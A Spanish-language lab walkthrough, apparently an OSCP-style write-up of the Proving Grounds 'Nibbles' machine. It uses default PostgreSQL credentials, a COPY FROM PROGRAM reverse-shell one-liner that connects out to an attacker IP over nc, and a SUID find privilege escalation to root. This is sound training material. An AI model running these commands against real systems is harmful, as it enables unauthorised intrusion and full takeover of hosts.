---
layout: post
title: Nibbles (Linux - Intermediate) - Proving Grounds Practice
date: 11.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, Privilege Escalation, SUID, FIND, File Permissions, PostgreSQL, PostgreSQL RCE, Fuzzing, Database, Intermediate]
image:
  path: assets/img/post-img/PGimage-Title/PG-Title.svg
  alt: 
---

# Resolución paso a paso de la máquina Nibbles:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.201.47 -oG allPorts
```

![image.png](assets/img/post-img/Nibbles/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p21,22,80,5437 --min-rate 5000 192.168.201.47 -oN targeted
```

![image.png](assets/img/post-img/Nibbles/image%201.png)

## EXPLOTACIÓN

- Después de enumerar varias cosas como las versiones de los servicios que corren en cada puerto, realizar fuerza bruta de directorios, intentar también fuerza bruta contra algunos de esos servicios… Descubrimos que podemos acceder a **POSTGRESQL** con credenciales por defecto y, desde dentro podemos operar para crearnos una nueva **TABLA** desde la que podremos lanzarnos una **REVERSE SHELL**:

### PostgreSQL

- Accedemos al servicio PostgreSQL por el puerto 5437 con las credenciales por defecto:

> 
**User:  postgres**  
**Password: postgres**
> 

```sql
psql -h 192.168.201.47 -p 5437 -U postgres
```

![image.png](assets/img/post-img/Nibbles/image%202.png)

- Una vez dentro de la **BBDD** enumeramos un poco pero vemos que solo están la **BBDD** por defecto, así que vamos a crear una nueva **TABLA** dentro de la propia base de datos **POSTGRES** para, desde ahí, lanzar una **REVERSE SHELL** hacia nuestra máquina atacante:

```sql
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>%261|nc 192.168.45.223 80 >/tmp/f';
```

![image.png](assets/img/post-img/Nibbles/image%203.png)

- Nos ponemos en escucha con NC y recibimos la conexión:

```bash
nc -lvnp 80
```

![image.png](assets/img/post-img/Nibbles/image%204.png)

## TRATAMIENTO DE LA TTY

- Realizamos el tratamiento de la **TTY** para poder trabajar más cómodos desde una **SHELL INTERACTIVA**:

```bash
script /dev/null -c bash

control+z

stty raw -echo; fg

reset xterm

export TERM=xterm-256color

export SHELL=bash

stty rows 52 columns 214 
```

- Una vez dentro de la máquina víctima nos dirigimos hacia el directorio principal del único usuario que vemos,  que se llama **WILSON** y, desde ahí,  ya podemos leer la primera **FLAG**:

![image.png](assets/img/post-img/Nibbles/image%205.png)

## ESCALADA DE PRIVILEGIOS

- Enumerando los permisos **SUID** descubrimos que el binario **FIND** tiene los permisos mal configurados y nos puede servir para escalar privilegios:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image.png](assets/img/post-img/Nibbles/image%206.png)

- Podemos aprovechar rápidamente esta vulnerabilidad ejecutando el programa ***find*** para buscar cualquier archivo conocido, como nuestra propia carpeta de escritorio. Una vez que se encuentra el archivo, **podemos indicarle *a find* que realice cualquier acción mediante el parámetro *-exec*** . En este caso, queremos ejecutar una shell en bash junto con el parámetro ***-p*** que impide que se restablezca el usuario efectivo.

```bash
find /home/wilson -exec "/usr/bin/bash" -p \;
```

![image.png](assets/img/post-img/Nibbles/image%207.png)

- Ahora ya podemos ir al directorio de **ROOT** y leer la **FLAG**:

![image.png](assets/img/post-img/Nibbles/image%208.png)